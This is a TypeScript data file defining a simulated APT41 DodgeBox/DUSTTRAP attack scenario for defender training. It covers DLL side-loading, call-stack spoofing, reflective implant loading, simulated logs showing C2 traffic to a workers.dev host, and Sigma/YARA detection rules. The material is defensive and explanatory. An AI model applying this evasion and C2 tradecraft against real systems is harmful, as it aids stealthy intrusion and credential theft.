  shortSubtitle: 'Elastic Security Labs / Mandiant · DLL Side-Loading, Synthetic Stack Frames & ChaCha20 DUSTTRAP',
  category: 'MALWARE',
  severity: 'CRITICAL',
  primaryMitrePhase: 4,
  overview:
    'Documented by Elastic Security Labs and Google Threat Intelligence / Mandiant (2024), APT41 (Brass Typhoon / Wicked Panda) deployed an updated arsenal featuring DodgeBox and DUSTPAN loaders to deliver the multi-stage DUSTTRAP implant and Cobalt Strike. The attack chain side-loads a malicious DLL, uses synthetic call-stack spoofing (faking RtlUserThreadStart and BaseThreadInitThunk return addresses) during NtAllocateVirtualMemory syscalls to evade EDR stack-walking, and decrypts ChaCha20-Poly1305 payloads in memory.',
  specs: [
    {
      term: 'PRIMARY SOURCE',
      value: 'Elastic Security Labs & Mandiant — APT41 DodgeBox / DUSTPAN / DUSTTRAP Analysis',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1574.002 (DLL Side-Loading) · T1055 (Call-Stack Spoofing) · T1620 (Reflective Load)',
    },
    {
      term: 'EVASION TRADECRAFT',
      value: 'Synthetic Call-Stack Spoofing (Kernel32!BaseThreadInitThunk + Ntdll!RtlUserThreadStart)',
    },
    {
      term: 'PAYLOAD CRYPTO',
      value: 'AES-GCM / ChaCha20-Poly1305 In-Memory Decryption (DUSTPAN -> DUSTTRAP)',
    },
  ],
  nodes: [
    {
      id: 'apt41_cf_worker_c2',
      label: 'APT41 Cloudflare Worker C2',
      sublabel: 'workers.dev HTTPS Relay (:443)',
      role: 'attacker',
      x: 15,
      y: 44,
      details: {
        osOrType: 'APT41 Serverless C2 Fronting Infrastructure',
        pidOrPort: 'HTTPS :443 (TLS 1.3 / DoH)',
        privilege: 'External APT C2',
        artifacts: [
          'C2 Domain Fronting via Cloudflare Workers',
          'ChaCha20-Poly1305 Encrypted Tasking',
        ],
        description:
          'APT41 C2 relay hosted behind legitimate CDN/serverless worker endpoints to blend outbound DUSTTRAP traffic with normal enterprise HTTPS.',
      },
    },
    {
      id: 'wks_dodgebox_host',
      label: 'Signed Host Binary (taskhost.exe)',
      sublabel: 'PID 4920 · SRV-APP-04 (10.10.12.30)',
      role: 'victim_host',
      x: 44,
      y: 28,
      details: {
        osOrType: 'Windows Server 2022 Application Host',
        pidOrPort: 'PID 4920 · Side-Loaded ffmpeg.dll (DodgeBox)',
        privilege: 'High Integrity',
        artifacts: [
          'C:\\ProgramData\\AppService\\taskhost.exe (Signed)',
          'C:\\ProgramData\\AppService\\ffmpeg.dll (DodgeBox / DUSTPAN)',
        ],
        description:
          'Legitimate signed executable used to side-load APT41 DodgeBox / DUSTPAN loader DLL.',
      },
    },
    {
      id: 'stack_spoof_engine',
      label: 'DodgeBox Stack-Spoofing & DUSTTRAP',
      sublabel: 'Synthetic RSP Frames -> NtAllocateVirtualMemory',
      role: 'memory',
      x: 54,
      y: 72,
      details: {
        osOrType: 'In-Memory Reflective Loader & Call-Stack Spoofer',
        pidOrPort: '0x000001A8C0000000 (RW -> RX)',
        privilege: 'User-Mode Evasion Engine',
        artifacts: [
          'Spoofed Frame 1: kernel32.dll!BaseThreadInitThunk+0x14',
          'Spoofed Frame 2: ntdll.dll!RtlUserThreadStart+0x21',
          'Decrypted DUSTTRAP Modular Plugin Manager',
        ],
        description:
          'Constructs fake stack frames pointing to legitimate DLLs before executing indirect syscalls, hiding the unbacked loader origin from ETW stack-walks.',
      },
    },
    {
      id: 'internal_key_vault',
      label: 'Enterprise Code-Signing & AD',
      sublabel: '10.10.1.15 (Build & Key Server)',
      role: 'server',
      x: 78,
      y: 30,
      details: {
        osOrType: 'Internal Build & Certificate Server',
        pidOrPort: 'SMB :445 / WinRM :5985',
        privilege: 'High-Value Asset',
        artifacts: [
          'DUSTTRAP Plugin: Credential & Certificate Collector',
          'Lateral WMI Execution',
        ],
        description:
          'Internal build server targeted by DUSTTRAP post-exploitation plugins to harvest code-signing certificates and domain credentials.',
      },
    },
    {
      id: 'elastic_etw_siem',
      label: 'Elastic Defend & ETW Ti Sensor',
      sublabel: 'ETW Stack-Walk & Sysmon EID 7 / 10',
      role: 'firewall_siem',
      x: 86,
      y: 68,
      details: {
        osOrType: 'Elastic Security EDR & Kernel ETW Sensor',
        pidOrPort: 'Microsoft-Windows-Threat-Intelligence',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'Alert: Call-Stack Spoofing & Unbacked PE Header Scrubbing',
          'YARA: Windows_Trojan_Dustpan / DodgeBox',
        ],
        description:
          'Correlates unsigned DLL side-loading with anomalous thread call-stacks and PE header zeroing in virtual memory.',
      },
    },
  ],
  processTree: [
    {
      pid: 4920,
      ppid: 1940,
      name: 'taskhost.exe (Relocated)',
      commandLine: 'C:\\ProgramData\\AppService\\taskhost.exe',
      user: 'CORP\\svc_app',
      integrity: 'High',
      status: 'injected',
      activeFromStage: 1,
      apiCalls: [
        'LoadLibraryW("ffmpeg.dll")',
        'RtlLookupFunctionEntry (Stack Frame Calculation)',
        'NtAllocateVirtualMemory (Indirect Syscall)',
        'NtProtectVirtualMemory (PAGE_EXECUTE_READ)',
      ],
      memoryBlocks: [
        {
          address: '0x000001A8C0000000',
          section: 'DUSTTRAP Reflective Implant (MZ Scrubbed)',
          permissions: 'R-X',
          size: '312 KB',
          status: 'injected',
          description:
            'Reflectively mapped DUSTTRAP implant with zeroed DOS/PE headers and spoofed thread call stack.',
          hexPreview: '00 00 00 00 00 00 00 00 00 00 00 00 48 89 5C 24',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'DODGEBOX / DUSTPAN DLL SIDE-LOADING & ENV KEYING',
      subtitle: 'Relocated signed binary loads malicious ffmpeg.dll and validates host key',
      description:
        'APT41 stages a legitimate signed Windows binary alongside a trojanized DLL (ffmpeg.dll, containing DodgeBox or DUSTPAN) in C:\\ProgramData\\AppService\\. Upon execution, the DLL checks environmental guardrails (domain name / computer name hash) before decrypting the next-stage payload.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1574.002',
      mitreTechniqueName: 'Hijack Execution Flow: DLL Side-Loading',
      activeNodeIds: ['wks_dodgebox_host', 'stack_spoof_engine', 'elastic_etw_siem'],
      compromisedNodeIds: ['wks_dodgebox_host', 'stack_spoof_engine'],
      keySpecs: [
        { term: 'LOADER FAMILY', value: 'DodgeBox / DUSTPAN (APT41 / Brass Typhoon)' },
        { term: 'SIDE-LOADED DLL', value: 'C:\\ProgramData\\AppService\\ffmpeg.dll (Unsigned)' },
        { term: 'GUARDRAIL', value: 'Environmental Keying (GetComputerNameExW Hash Check)' },
      ],
    },
    {
      index: 2,
      title: 'CALL-STACK SPOOFING & REFLECTIVE DUSTTRAP MAPPING',
      subtitle: 'Synthesizing legitimate unwind frames via RtlLookupFunctionEntry before syscall',
      description:
        'Before invoking NtAllocateVirtualMemory and NtProtectVirtualMemory, DodgeBox parses the .pdata exception directory of kernel32.dll and ntdll.dll to construct a synthetic call stack (BaseThreadInitThunk -> RtlUserThreadStart). It maps the ChaCha20-decrypted DUSTTRAP implant into memory, transitions permissions from RW to RX, and zeroes out the MZ/PE headers.',
      mitreTacticPhase: 4,
      mitreTechniqueId: 'T1620',
      mitreTechniqueName: 'Reflective Code Loading',
      activeNodeIds: ['wks_dodgebox_host', 'stack_spoof_engine', 'elastic_etw_siem'],
      compromisedNodeIds: ['wks_dodgebox_host', 'stack_spoof_engine'],
      keySpecs: [
        { term: 'EVASION TECHNIQUE', value: 'Synthetic Call-Stack Spoofing (.pdata Unwind Gadget)' },
        { term: 'MEMORY OPSEC', value: 'RW -> RX Transition + PE Header Zeroing (0x00)' },
        { term: 'DECRYPTED IMPLANT', value: 'DUSTTRAP Multi-Plugin Backdoor (ChaCha20-Poly1305)' },
      ],
    },
    {
      index: 3,
      title: 'CLOUDFLARE WORKER C2 & PLUGIN EXECUTION',
      subtitle: 'DUSTTRAP loads modular plugins and beacons over TLS 1.3',
      description:
        'DUSTTRAP initializes its in-memory plugin orchestrator, loading modules for credential harvesting, active directory reconnaissance, and WMI lateral movement toward the enterprise build server, while communicating over TLS 1.3 to an APT41 Cloudflare Worker relay.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1071.001',
      mitreTechniqueName: 'Application Layer Protocol: Web Protocols',
      activeNodeIds: ['stack_spoof_engine', 'apt41_cf_worker_c2', 'internal_key_vault', 'elastic_etw_siem'],
      compromisedNodeIds: ['wks_dodgebox_host', 'stack_spoof_engine', 'internal_key_vault'],
      keySpecs: [
        { term: 'C2 FRONTING', value: 'HTTPS TLS 1.3 via Serverless Worker Endpoint' },
        { term: 'PLUGIN MODULES', value: 'Shell, FileOps, TokenManip, PortForward, Keylogger' },
        { term: 'TARGET ASSET', value: 'Enterprise Build & Code-Signing Server (10.10.1.15)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'el-apt41-1',
      no: 1,
      stageIndex: 1,
      timestamp: '02:31:10.405',
      sourceNodeId: 'wks_dodgebox_host',
      targetNodeId: 'stack_spoof_engine',
      sourceLabel: 'taskhost.exe (PID 4920)',
      targetLabel: 'ffmpeg.dll (DodgeBox)',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 7',
      shortAction: 'SIDELOAD DODGEBOX',
      info: 'Image=C:\\ProgramData\\AppService\\taskhost.exe ImageLoaded=C:\\ProgramData\\AppService\\ffmpeg.dll Signed=false',
      sizeOrCode: 'Unsigned DLL',
      severity: 'HIGH',
      mitreId: 'T1574.002',
      explanation:
        'A relocated Windows system binary (taskhost.exe) running from C:\\ProgramData\\AppService\\ loads an unsigned ffmpeg.dll containing the APT41 DodgeBox/DUSTPAN loader.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>7</EventID>
    <Computer>SRV-APP-04.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\ProgramData\\AppService\\taskhost.exe</Data>
    <Data Name="ImageLoaded">C:\\ProgramData\\AppService\\ffmpeg.dll</Data>
    <Data Name="Signed">false</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Relocated System Binary Side-Loading Unsigned DLL from ProgramData',
        ruleCode: `title: APT41 DodgeBox / DUSTPAN DLL Side-Loading Pattern
logsource:
  category: image_load
  product: windows
detection:
  selection:
    Image|startswith: 'C:\\ProgramData\\'
    Signed: 'false'
  condition: selection
level: high`,
        mitigation:
          'Audit and block execution of Windows system binaries relocated outside C:\\Windows\\System32\\.',
      },
    },
    {
      id: 'el-apt41-2',
      no: 2,
      stageIndex: 2,
      timestamp: '02:31:11.092',
      sourceNodeId: 'stack_spoof_engine',
      targetNodeId: 'elastic_etw_siem',
      sourceLabel: 'DodgeBox Loader',
      targetLabel: 'ETW Threat-Intel',
      sourceType: 'MEMORY_SCAN',
      protocolOrEventId: 'ETW Ti / CallStack',
      shortAction: 'STACK SPOOF + RX',
      info: 'NtProtectVirtualMemory(0x01A8C0000000, PAGE_EXECUTE_READ) with Synthetic Unwind Gadgets',
      sizeOrCode: '312 KB RX',
      severity: 'CRITICAL',
      mitreId: 'T1620',
      explanation:
        'DodgeBox constructs synthetic stack frames via RtlLookupFunctionEntry and scrubs the PE header after mapping DUSTTRAP into private executable memory.',
      rawLog: `[ELASTIC_DEFEND_CALLSTACK_ANOMALY]
Process: C:\\ProgramData\\AppService\\taskhost.exe (PID 4920)
Syscall: NtProtectVirtualMemory (RW -> RX) at 0x000001A8C0000000
CallStack:
  [0] ntdll.dll!NtProtectVirtualMemory+0x14
  [1] kernelbase.dll!VirtualProtectEx+0x32 (Gadget Return without preceding CALL instruction)
  [2] kernel32.dll!BaseThreadInitThunk+0x14
  [3] ntdll.dll!RtlUserThreadStart+0x21`,
      detectionRule: {
        type: 'YARA',
        title: 'APT41 DodgeBox / DUSTPAN Reflective Loader Signature',
        ruleCode: `rule APT41_DodgeBox_Dustpan_Loader {
  meta:
    author = "Elastic Security Labs / Mandiant"
    actor = "APT41 (Brass Typhoon)"
  strings:
    $chacha = "expand 32-byte k" ascii
    $api1 = "RtlLookupFunctionEntry" ascii
    $api2 = "NtAllocateVirtualMemory" ascii
  condition:
    uint16(0) == 0x5A4D and all of them
}`,
        mitigation:
          'Inspect thread call-stacks where return addresses point to instructions not preceded by a valid CALL opcode (call-stack spoofing detection).',
      },
    },
    {
      id: 'el-apt41-3',
      no: 3,
      stageIndex: 3,
      timestamp: '02:31:14.780',
      sourceNodeId: 'wks_dodgebox_host',
      targetNodeId: 'apt41_cf_worker_c2',
      sourceLabel: '10.10.12.30 (DUSTTRAP)',
      targetLabel: 'workers.dev:443',
      sourceType: 'SYSMON',
      protocolOrEventId: 'Sysmon EID 3',
      shortAction: 'WORKER TLS C2',
      info: 'Image=C:\\ProgramData\\AppService\\taskhost.exe DestinationHostname=telemetry-sync.workers.dev:443',
      sizeOrCode: 'TLS 1.3',
      severity: 'HIGH',
      mitreId: 'T1071.001',
      explanation:
        'DUSTTRAP uses serverless worker domains over TLS 1.3 to receive modular plugins and exfiltrate stolen certificates and credentials.',
      rawLog: `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>3</EventID>
    <Computer>SRV-APP-04.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\ProgramData\\AppService\\taskhost.exe</Data>
    <Data Name="DestinationHostname">telemetry-sync.workers.dev</Data>
    <Data Name="DestinationPort">443</Data>
  </EventData>
</Event>`,
      detectionRule: {
        type: 'SIGMA',
        title: 'System Binary Connecting to Serverless Worker C2 Domains',
        ruleCode: `title: Suspicious Outbound Connection to Serverless Worker Domain
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationHostname|endswith:
      - '.workers.dev'
      - '.pages.dev'
    Image|startswith: 'C:\\ProgramData\\'
  condition: selection
level: high`,
        mitigation:
          'Restrict server egress via proxy allowlists and inspect TLS SNI headers for unauthorized *.workers.dev connections.',
      },
    },
  ],
};

export const APT_PALOALTO_ELASTIC_SCENARIOS: AttackScenario[] = [
  UNIT42_PANOS_MIDNIGHT_ECLIPSE_SCENARIO,
  ELASTIC_GRIMRESOURCE_MSC_SCENARIO,
  ELASTIC_LOTUS_BLOSSOM_CHRYSALIS_SCENARIO,
  UNIT42_SCATTERED_SPIDER_CLOUD_SCENARIO,
  ELASTIC_APT41_DUSTPAN_STEALTHVECTOR_SCENARIO,
];
